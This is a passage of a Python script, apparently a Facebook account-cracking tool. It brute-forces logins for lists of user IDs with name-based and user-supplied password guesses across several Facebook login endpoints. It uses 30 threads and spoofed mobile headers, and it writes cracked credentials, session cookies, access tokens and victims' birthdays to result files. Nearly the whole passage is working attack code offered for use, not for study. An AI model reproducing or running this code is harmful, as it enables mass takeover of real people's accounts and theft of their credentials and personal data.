					pwx = [name, nam[0]+"123", nam[0]+"12345", nam[0]+"1", nam[0]+"12", nam[0]+"123456", nam[0]+"123456789", nam[0]+"1122", nam[0]+"786"]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"12345", nam[0]+"1", nam[0]+"12", nam[0]+"123456", nam[0]+"123456789", nam[0]+"1122", nam[0]+"786"]
				fall.submit(crack, uid, pwx,"https://m.facebook.com")
		input("\n\033[1;97m[\033[1;94m+\033[1;97m] Back ");menu()
def manual():
	print(" ")
	print("\033[1;97m[\033[1;94m+\033[1;97m] For Example : 786786,Pakistan etc ")
	pwek=input('\033[1;97m[\033[1;94m+\033[1;97m] Enter Password: ')
	if pwek=="":
		exit("\033[1;97m[\033[1;94m+\033[1;97m] Wrong Input ")
	elif len(pwek)<=5:
		exit("\033[1;97m[\033[1;94m+\033[1;97m] Password Must Be 6 Digits Or Long ")
	print(" ")
	print("\033[1;97m[\033[1;94m01\033[1;97m] Method B-API");print("\033[1;97m[\033[1;94m02\033[1;97m] Method Mbasic");print("\033[1;97m[\033[1;94m03\033[1;97m] Method Mobile");print("\033[1;97m[\033[1;94m03\033[1;97m] Method D.Facebook");print("\033[1;97m[\033[1;94m03\033[1;97m] Method X.Facebook")
	ask=input("\033[1;97m[\033[1;94m>>\033[1;97m] Choose : ")
	if ask=="":
		menu()
	elif ask=="1" or ask=="01":
		print('\033[1;97m[\033[1;94m+\033[1;97m] Crack Result [CP] Save In  CP/00-XXXX-2022.txt');print('\033[1;97m[\033[1;94m+\033[1;97m] Crack Result [OK] Save In  OK/00-XXXX-2022.txt')
		print(" ")
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				fall.submit(api, uid, pwek.split(","))
		input("\n\033[1;97m[\033[1;94m+\033[1;97m] Back ");menu()
	elif ask=="2" or ask=="02":
		print('\033[1;97m[\033[1;94m+\033[1;97m] Crack Result [CP] Save In  CP/00-XXXX-2022.txt');print('\033[1;97m[\033[1;94m+\033[1;97m] Crack Result [OK] Save In  OK/00-XXXX-2022.txt')
		print(" ")
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				fall.submit(crack, uid, pwek.split(","),"https://mbasic.facebook.com")
		input("\n\033[1;97m[\033[1;94m+\033[1;97m] Back ");menu()
	elif ask=="3" or ask=="03":
		print('\033[1;97m[\033[1;94m+\033[1;97m] Crack Result [CP] Save In  CP/00-XXXX-2022.txt');print('\033[1;97m[\033[1;94m+\033[1;97m] Crack Result [OK] Save In  OK/00-XXXX-2022.txt')
		print(" ")
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				fall.submit(crack, uid, pwek.split(","),"https://d.facebook.com")
		input("\n\033[1;97m[\033[1;94m+\033[1;97m] Back ");menu()
	elif ask=="4" or ask=="04":
		print('\033[1;97m[\033[1;94m+\033[1;97m] Crack Result [CP] Save In  CP/00-XXXX-2022.txt');print('\033[1;97m[\033[1;94m+\033[1;97m] Crack Result [OK] Save In  OK/00-XXXX-2022.txt')
		print(" ")
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				fall.submit(crack, uid, pwek.split(","),"https://x.facebook.com")
		input("\n\033[1;97m[\033[1;94m+\033[1;97m] Back ");menu()
	elif ask=="5" or ask=="05":
		print('\033[1;97m[\033[1;94m+\033[1;97m] Crack Result [CP] Save In  CP/00-XXXX-2022.txt');print('\033[1;97m[\033[1;94m+\033[1;97m] Crack Result [OK] Save In  OK/00-XXXX-2022.txt')
		print(" ")
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				fall.submit(crack, uid, pwek.split(","),"https://m.facebook.com")
		input("\n\033[1;97m[\033[1;94m+\033[1;97m] Back ");menu()

def gabungkan():
	print(" ")
	print("\033[1;97m[\033[1;94m+\033[1;97m] For Example : 786786,Pakistan etc ")
	pwek=input('\033[1;97m[\033[1;94m+\033[1;97m] Enter Password: ')
	if pwek=="":
		menu()
	elif len(pwek)<=5:
		exit("\033[1;97m[\033[1;94m+\033[1;97m] Password Must Be 6 Digits Or Long ")
	print(" ")
	print("\033[1;97m[\033[1;94m01\033[1;97m] B-Api.Facebook")
	print("\033[1;97m[\033[1;94m02\033[1;97m] Mbasic.Facebook")
	print("\033[1;97m[\033[1;94m03\033[1;97m] M.Facebook")
	print("\033[1;97m[\033[1;94m04\033[1;97m] D.Facebook")
	print("\033[1;97m[\033[1;94m05\033[1;97m] X.Facebook")
	print(" ")
	ask=input("\033[1;97m[\033[1;94m>>\033[1;97m] Choose : ")
	if ask=="":
		menu
	elif ask=="1" or ask=="01":
		print('\033[1;97m[\033[1;94m+\033[1;97m] Crack Result [CP] Save In  CP/00-XXXX-2022.txt');print('\033[1;97m[\033[1;94m+\033[1;97m] Crack Result [OK] Save In  OK/00-XXXX-2022.txt')
		print(" ")
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"12345",pwek.split(",")]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"12345",pwek.split(",")]
				fall.submit(api, uid, pwx)
		input("\n\033[1;97m[\033[1;94m+\033[1;97m] Back ");menu()
	elif ask=="2" or ask=="02":
		print('\033[1;97m[\033[1;94m+\033[1;97m] Crack Result [CP] Save In  CP/00-XXXX-2022.txt');print('\033[1;97m[\033[1;94m+\033[1;97m] Crack Result [OK] Save In  OK/00-XXXX-2022.txt')
		print(" ")
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"12345",pwek.split(",")]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"12345",pwek.split(",")]
				fall.submit(crack, uid, pwx,"https://mbasic.facebook.com")
		input("\n\033[1;97m[\033[1;94m+\033[1;97m] Back ");menu()
	elif ask=="3" or ask=="03":
		print('\033[1;97m[\033[1;94m+\033[1;97m] Crack Result [CP] Save In  CP/00-XXXX-2022.txt');print('\033[1;97m[\033[1;94m+\033[1;97m] Crack Result [OK] Save In  OK/00-XXXX-2022.txt')
		print(" ")
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"12345",pwek.split(",")]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"12345",pwek.split(",")]
				fall.submit(crack, uid, pwx,"https://m.facebook.com")
		input("\n\033[1;97m[\033[1;94m+\033[1;97m] Back ");menu()
	elif ask=="4" or ask=="04":
		print('\033[1;97m[\033[1;94m+\033[1;97m] Crack Result [CP] Save In  CP/00-XXXX-2022.txt');print('\033[1;97m[\033[1;94m+\033[1;97m] Crack Result [OK] Save In  OK/00-XXXX-2022.txt')
		print(" ")
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"12345",pwek.split(",")]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"12345",pwek.split(",")]
				fall.submit(crack, uid, pwx,"https://d.facebook.com")
		input("\n\033[1;97m[\033[1;94m+\033[1;97m] Back ");menu()
	elif ask=="5" or ask=="05":
		print('\033[1;97m[\033[1;94m+\033[1;97m] Crack Result [CP] Save In  CP/00-XXXX-2022.txt');print('\033[1;97m[\033[1;94m+\033[1;97m] Crack Result [OK] Save In  OK/00-XXXX-2022.txt')
		print(" ")
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"12345",pwek.split(",")]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"12345",pwek.split(",")]
				fall.submit(crack, uid, pwx,"https://x.facebook.com")
		input("\n\033[1;97m[\033[1;94m+\033[1;97m] Back ");menu()
	
def api(uid, pwx):
	try:
		ua = open("ugent.txt", "r").read()
	except IOError:
		ua = 'NokiaX2-02/2.0 (11.79) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2;.NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2) UCBrowser8.4.0.159/70/352'
	global ok, cp, loop, token
	sys.stdout.write(
		"\r%s[%sCracking%s]%s/%s [OK][%s] - [CP][%s] "%(N,B,N,loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for pw in pwx:
		pw = pw.lower()
		headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
		send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
		if "session_key" in send.text and "EAAA" in send.text:
			print("\r %s[OK] %s | %s | %s"%(H,uid, pw, send.json()["access_token"]))
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.txt"%(tanggal),"a").write(" [OK] %s|%s\n"%(uid, pw))
			break
		elif "www.facebook.com" in send.json()["error_msg"]:
			try:
				token = open("token.txt", "r").read()
				ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
				month, day, year = ttl.split("/")
				month = bulan[month]
				print("\r %s[CP] %s | %s | %s %s %s"%(K,uid, pw, day, month, year))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tanggal),"a").write(" [CP] %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
				break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print("\r %s[CP] %s | %s        "%(K,uid, pw))
			cp.append("%s|%s"%(uid, pw))
			open("CP/%s.txt"%(tanggal),"a").write(" [CP] %s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1

### CRACK MBASIC M FB ###
def crack(uid, pwx, host, **kwargs):
	try:
		ua = open("ugent.txt", "r").read()
	except IOError:
		ua = 'NokiaX2-02/2.0 (11.79) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2;.NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2) UCBrowser8.4.0.159/70/352'
	global ok, cp, loop, token
	sys.stdout.write(
		"\r%s[%sCracking%s] %s/%s [OK][%s] - [CP][%s] "%(N,B,N,loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	try:
		for pw in pwx:
			kwargs = {}
			pw = pw.lower()
			ses = requests.Session()
			ses.headers.update({"origin": host, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",host)), "referer": host+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
			p = ses.get(host+"/login/?next&ref=dbl&refid=8").text
			b = parser(p,"html.parser")
			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
			for i in b("input"):
				try:
					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
					else:continue
				except:pass
			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
			gaaa = ses.post(host+"/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
			if "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
				print("\r %s[OK] %s | %s | %s"%(H,uid, pw, kuki))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tanggal),"a").write(" [OK] %s|%s\n"%(uid, pw))
				break
			elif "checkpoint" in ses.cookies.get_dict().keys():
				try:
					token = open("token.txt", "r").read()
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan[month]
					print("\r %s[CP] %s | %s | %s %s %s"%(K,uid, pw, day, month, year))
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.txt"%(tanggal),"a").write(" [CP] %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
					break
				except (KeyError, IOError):
					day = (" ")
					month = (" ")
					year = (" ")
				except:pass
				print("\r %s[CP] %s | %s        "%(K,uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tanggal),"a").write(" [CP] %s|%s\n"%(uid, pw))
				break
			else:
				continue

		loop+=1
	except Exception as e:
		if "free.facebook.com" in host:
			return crack(uid, pwx, host)
		else:
			return crack(uid, pwx, "https://free.facebook.com")

if __name__=='__main__':
	os.system('git pull')
	menu()


